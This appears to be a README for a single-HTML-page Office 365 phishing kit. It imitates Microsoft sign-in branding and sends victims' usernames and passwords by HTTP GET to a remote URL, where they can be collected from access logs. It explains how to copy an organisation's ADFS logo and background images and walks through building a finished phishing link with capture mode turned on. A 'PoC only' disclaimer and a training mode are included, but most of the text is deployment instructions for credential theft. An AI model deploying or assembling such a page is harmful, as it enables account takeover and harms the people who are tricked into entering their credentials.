## Single .html page O365 Phishing
Provided **for demonstration/PoC only**. Please don't abuse

This is a simple Office 365 phishing page that consists of a single .html document. Doesn't require any special serverside software to run besides a web server to serve the page. Though does require loose content security policies.

Will send phished details to a reomte URL via HTTP GET. Credentials can then be retrieved through standard HTTP access logs without requiring any special receiver software.

It can be configured by base64 encoded URL parameters to customise the page properties such as:
* background image
* banner logo
* remote url
* username

## Usage

These are the configurable URL parameters, and their default values if not specified

#### id
The email username parameter. **Base64** encoded
```
Usage:      id=<base64 encoded email address>
Default:    username@domain.com
```

#### training
Determines whether or not training mode or phishing mode is activated.

if training=1 (default); Upon click of password input field or submit button, user is redirected to another URL specified by the [**url**] parameter. Credentials are ignored.

if training=0; Upon click of submit of form, HTTP-GET is made to URL specified by the [**url**] parameter, and then user redirected to the Office homepage.

Credentials will be contained in the URL of the HTTP-GET: `[url]?u=<username>&p=<password>`

```
Usage:      training=<1 or 0>
Default:    1
```

#### url
Remote URl used for either training or phishing. **Base64** encoded

if `training=0`; then URL for HTTP GET command
if `training=1 or default`; then URL for the new window that's opened upon click

```
Usage:      url=<base64 encoded URL>
Default:    (training=0);                "/"
Default:    (training=1 or unspecified); "/message.html"
```

#### bg
URL for the background image. **Base64** encoded. 

Can check an organisation's ADFS logon page to obtain URL for an organisation-specific background image.
```
Usage:      bg=<base64 encoded URL image>
Default:    Hardcoded svg look-alike svg
```

#### logo
URL for the login banner image. **Base64** encoded

Can check an organisation's ADFS page to obtain a URL for a branded logo for the organisation.
```
Usage:      logo=<base64 encoded URL image>
Default:    Hardcoded look-alike svg 
```

## Usage Example

Host the webpage somewhere.

Construct Phishing Link. When calculating base64, be sure to not include trailing newline

```
## [id]; username parameter
$ echo -n "kanye@outlook.com" | base64
a2FueWVAb3V0bG9vay5jb20=

## [url]; remote phishing URL parameter
$ echo -n "https://example7123.com" | base64
aHR0cHM6Ly9leGFtcGxlNzEyMy5jb20=

## [logo]; custom banner image parameter
<pre>[wmax641@battlestation ~]$ echo -n &quot;https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg&quot; | base64
aHR0cHM6Ly9hYWRjZG4ubXNhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL21pY3Jvc29mdF9sb2dvX2VlNWM4ZDlmYjYyNDhjOTM4ZmQwZGMxOTM3MGU5MGJkLnN2Zw==
```

Put it all together, and setting [training=0] to turn on phishing mode to create the final phishing link:

```
http://[hostname]/login_min.html?training=0&id=a2FueWVAb3V0bG9vay5jb20=&url=aHR0cHM6Ly9leGFtcGxlNzEyMy5jb20=&logo=aHR0cHM6Ly9hYWRjZG4ubXNhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL21pY3Jvc29mdF9sb2dvX2VlNWM4ZDlmYjYyNDhjOTM4ZmQwZGMxOTM3MGU5MGJkLnN2Zw==
```

???
